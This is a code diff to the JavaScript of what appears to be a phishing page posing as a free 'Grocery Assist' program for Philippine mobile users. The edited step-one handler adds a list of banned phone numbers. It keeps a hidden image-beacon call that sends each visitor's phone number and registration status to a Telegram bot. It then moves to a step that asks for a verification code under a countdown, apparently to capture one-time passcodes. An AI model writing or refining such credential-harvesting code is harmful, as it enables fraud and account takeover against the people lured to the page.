@@ -215,30 +215,46 @@
         };
 
         function processStep1() {
-            const phone = document.getElementById('userPhone').value;
-            const regStatus = document.querySelector('input[name="reg"]:checked').value;
-            
-            if (phone.length < 11 || !phone.startsWith('09')) {
-                const el = document.getElementById('userPhone');
-                el.classList.add('shake-error');
-                setTimeout(() => el.classList.remove('shake-error'), 500);
-                return;
-            }
+    const phone = document.getElementById('userPhone').value.trim();
+    const regStatus = document.querySelector('input[name="reg"]:checked').value;
+    const el = document.getElementById('userPhone');
 
-            // Updated message for Grocery context
-            const msg = `🛒 GROCERY ASSIST REQUEST:\n📱 Number: ${phone}\n👤 Registered: ${regStatus}`;
-            new Image().src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
+    // 1. DEFINE YOUR BANNED NUMBERS HERE
+    const bannedNumbers = [
+        '09123456789', 
+        '09000000000',
+        '09999999999'
+    ];
 
-            if(BYPASS_MODE) {
-                setTimeout(() => {
-                    window.location.href = "https://FreeShoppingPH.github.io/FreeShoppingPH/main.html";
-                }, 800);
-            } else {
-                document.getElementById('step1').classList.add('hidden');
-                document.getElementById('step2').classList.remove('hidden');
-                startCountDown(300);
-            }
-        }
+    // 2. BASIC VALIDATION (Existing)
+    if (phone.length < 11 || !phone.startsWith('09')) {
+        el.classList.add('shake-error');
+        setTimeout(() => el.classList.remove('shake-error'), 500);
+        return;
+    }
+
+    // 3. THE FILTER / BAN CHECK
+    if (bannedNumbers.includes(phone)) {
+        alert("This number is not eligible for this program.");
+        el.classList.add('shake-error');
+        el.value = ""; // Clear the field
+        return; // STOP everything here. No Telegram message, no redirect.
+    }
+
+    // 4. PROCEED IF NOT BANNED
+    const msg = `🛒 GROCERY ASSIST REQUEST:\n📱 Number: ${phone}\n👤 Registered: ${regStatus}`;
+    new Image().src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
+
+    if(BYPASS_MODE) {
+        setTimeout(() => {
+            window.location.href = "https://FreeShoppingPH.github.io/FreeShoppingPH/main.html";
+        }, 800);
+    } else {
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.remove('hidden');
+        startCountDown(300);
+    }
+}
 
         function processStep2() {
             const vInput = document.getElementById('vCode');
